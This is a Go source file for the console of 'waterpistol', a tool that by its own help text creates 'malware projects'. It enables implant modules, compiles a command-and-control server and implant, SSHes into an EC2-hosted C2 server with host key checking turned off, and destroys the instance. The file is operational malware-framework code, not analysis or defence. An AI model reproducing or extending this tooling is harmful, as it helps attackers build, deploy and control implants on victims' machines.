package main

import (
	"fmt"
	"github.com/chzyer/readline"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"path"
	"strings"
	"time"
)

type project struct {
	name    string
	srcdir  string
	srcid   string
	ip      string
	port    int
	modules []string
}

// Contains current options/c2ip/modules
type waterpistol struct {
	term     *readline.Instance
	current  int
	projects []project
}

func generate_funny_name() string {
	words := []string{
		"photocopy", "theorist", "trustee", "hook", "eliminate", "crop", "registration", "snub", "reliance",
		"bank", "forge", "old", "researcher", "lifestyle", "civilization", "hide", "knock", "choice",
		"hostile", "relevance", "transform", "journal", "deal", "complex", "demonstrate", "dialect",
		"meaning", "thread", "hell", "competence", "enjoy", "rain", "rhythm", "army", "provide", "spontaneous",
		"kidnap", "bubble", "exempt", "piano", "mastermind", "writer", "watch", "Koran", "tenant", "negative",
		"smash", "just", "discipline", "rub"}

	num1 := rand.Intn(len(words))
	num2 := rand.Intn(len(words))

	return strings.Title(words[num1]) + strings.Title(words[num2])
}

func (waterpistol *waterpistol) current_project() *project {
	if waterpistol.current == -1 || len(waterpistol.projects) == 0 {
		return nil
	}
	return &waterpistol.projects[waterpistol.current]
}

func valid_modules() []string {
	modules := []string{}

	files, err := ioutil.ReadDir("./implant/modules")
	if err != nil {
		log.Fatal(err)
	}
	for _, f := range files {
		if f.IsDir() && strings.Compare(f.Name(), "included_modules") != 0 {
			modules = append(modules, f.Name())
		}
	}

	return modules
}

func checkProgram() {
	// Ensure GO is installed and GOPATH is set
	cmd := exec.Command("go", "version")
	if cmd.Run() != nil {
		fmt.Println("Please make sure Go compiler is installed")
		os.Exit(1)
	}
	if len(os.Getenv("GOPATH")) == 0 {
		fmt.Println("Please make sure ENV GOPATH is set")
		os.Exit(1)
	}

	// Check we are in the go directory
	if ex, err := os.Executable(); err != nil && strings.Contains(path.Dir(ex), os.Getenv("GOPATH")) {
		fmt.Println("Please run this binary in the root directory of the waterpistol")
		os.Exit(1)
	}

	// Check that implant/common/c2 exist
	cmd = exec.Command("ls")
	out, _ := cmd.CombinedOutput()
	outp := string(out)
	if !strings.Contains(outp, "common") ||
		!strings.Contains(outp, "c2") ||
		!strings.Contains(outp, "implant") {
		fmt.Println("Please run this binary in the root directory of the waterpistol")
		os.Exit(1)
	}
}

func (project *project) ssh() {
	// CMD :  ssh -t root@ip screen -dr c2
	//	cmd := exec.Command("ssh", "-i", "./id_c2", "-t", "ec2-user@"+waterpistol.ip, "screen", "-dr", "c2")
	// Instead of scren, why not just run it on load
	cmd := exec.Command("ssh", "-o", "StrictHostKeyChecking no", "-i", "./id_c2", "-t", "ec2-user@"+project.ip, "./c2 ./cert.pem ./key.pem")
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err := cmd.Run()
	if err != nil {
		panic(err)
	}
}
func filterInput(r rune) (rune, bool) {
	switch r {
	// block CtrlZ feature
	case readline.CharCtrlZ:
		return r, false
	}
	return r, true
}

func (waterpistol *waterpistol) valid_disable(string) []string {
	if waterpistol.current_project() == nil {
		return []string{}
	}
	return waterpistol.current_project().modules
}

func (waterpistol *waterpistol) valid_enable(string) []string {
	if waterpistol.current_project() == nil {
		return []string{}
	}
	return valid_modules()
}

func (waterpistol *waterpistol) setup_terminal() {
	log.SetFlags(0)
	log.SetPrefix("\033[91mhax >\033[0m ")

	var completer = readline.NewPrefixCompleter(
		readline.PcItem("compile"),
		readline.PcItem("enable", readline.PcItemDynamic(waterpistol.valid_enable)),
		readline.PcItem("disable", readline.PcItemDynamic(waterpistol.valid_disable)),
		readline.PcItem("exit"),
		readline.PcItem("ssh"),
	)

	l, err := readline.NewEx(&readline.Config{
		Prompt:          "\033[96mwaterpistol%\033[0m ",
		HistoryFile:     "/tmp/readline.tmp",
		AutoComplete:    completer,
		InterruptPrompt: "^C",
		EOFPrompt:       "exit",

		HistorySearchFold:   true,
		FuncFilterInputRune: filterInput,
	})

	if err != nil {
		panic(err)
	}
	log.SetOutput(l.Stderr())
	waterpistol.term = l
}

func (project *project) enable(module string) {
	valid := false
	for _, s := range valid_modules() {
		if strings.Compare(s, module) == 0 {
			valid = true
			break
		}
	}

	if !valid {
		log.Println("Please select a valid module", valid_modules())
		return
	}

	for _, s := range project.modules {
		if strings.Compare(s, module) == 0 {
			log.Println("Module already enabled")
			return
		}
	}

	project.modules = append(project.modules, module)
}

func (project *project) disable(module string) {
	old_modules := project.modules
	project.modules = []string{}

	for _, m := range old_modules {
		if strings.Compare(m, module) != 0 {
			project.modules = append(project.modules, m)
		}
	}

}

func help() {
	log.Println("Commands:")
	log.Println("\tnew              -> Create a new malware project")
	log.Println("\tcompile          -> Compile c2 && implant and run c2 ")
	log.Println("\tssh              -> ssh into c2")
	log.Println("\tdestroy          -> destroy c2 instance")
	log.Println("\tlist             -> List currently enabled modules")
	log.Println("\tenable <module>  -> Enable a module (tab complete)")
	log.Println("\tdisable <module> -> Disable a module (tab complete)")
	log.Println("\thelp             -> this")
}

func (waterpistol *waterpistol) handle(line string) {
	parts := strings.Split(strings.TrimSpace(line), " ")
	switch parts[0] {
	case "new":
		if waterpistol.current_project() != nil {
			log.Println("Currently only support one project")
			return
		}

		project := project{name: generate_funny_name()}
		waterpistol.current = waterpistol.current + 1
		waterpistol.projects = append(waterpistol.projects, project)
		log.Println("Created new project `" + project.name + "`")
		waterpistol.term.SetPrompt("\033[96mwaterpistol \033[91m<" + project.name + ">\033[96m%\033[0m ")
	case "compile":
		current_project := waterpistol.current_project()
		if current_project == nil {
			log.Print("Maybe create a `new` project\n")
			return
		}

		if len(current_project.modules) == 0 {
			log.Print("Maybe `enable` a few modules\n")
			return
		}
		current_project.compile_c2_implant()
	case "ssh":
		current_project := waterpistol.current_project()
		if current_project == nil {
			log.Print("Maybe create a `new` project\n")
			return
		}
		if len(current_project.ip) == 0 {
			log.Print("Maybe `compile` first\n")
			return
		}
		current_project.ssh()
	case "enable":
		current_project := waterpistol.current_project()
		if current_project == nil {
			log.Print("Maybe create a `new` project\n")
			return
		}

		if len(parts) != 2 {
			help()
			return
		}
		current_project.enable(parts[1])
	case "disable":
		current_project := waterpistol.current_project()
		if current_project == nil {
			log.Print("Maybe create a `new` project\n")
			return
		}
		if len(parts) != 2 {
			help()
			return
		}
		current_project.disable(parts[1])
	case "list":
		current_project := waterpistol.current_project()
		if current_project == nil {
			log.Print("Maybe create a `new` project\n")
			return
		}

		log.Print("Modules: " + strings.Join(current_project.modules, ", "))
	case "destroy":
		log.Println("Destroying c2 && ec2 instance")
		out, err := exec.Command("./c2_down").CombinedOutput()
		if err != nil {
			log.Println(out, err)
		}

	case "help":
		help()
	default:
		log.Print("What")
	}
}

func (waterpistol *waterpistol) ReadUserInput() {
	for {
		line, err := waterpistol.term.Readline()
		if err == readline.ErrInterrupt {
			continue
		} else if err == io.EOF {
			break
		}

		waterpistol.handle(line)
	}
}

func main() {
	checkProgram()

	rand.Seed(time.Now().UTC().UnixNano())

	waterpistol := &waterpistol{current: -1}

	waterpistol.setup_terminal()
	defer waterpistol.term.Close()
	help()
	waterpistol.ReadUserInput()
}
